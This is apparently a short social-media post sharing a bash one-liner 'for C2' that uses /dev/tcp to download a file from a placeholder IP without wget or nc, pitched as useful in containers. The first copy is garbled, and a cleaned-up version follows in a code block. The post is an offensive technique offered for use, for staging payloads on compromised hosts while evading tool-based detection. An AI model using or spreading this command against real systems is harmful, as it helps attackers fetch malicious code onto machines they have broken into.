One liner bash for C2 without using any native program like wget, nc etc, esp containers. 

#bash-c "exec 3<>/dev/tcp/IP/80; echo -e GET/ youfile.sh HTTP/1.1\r\nHost; ip\r\nConnection: close\r\n\r\n' >&3; cat <&3-> yourfile.sh'
```bash
bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /yourfile.sh HTTP/1.1\r\nHost: IP\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh"
```

Don’t forget the reactions and stars⭐️! 
They fuel my energy to post such contents🔋✨.
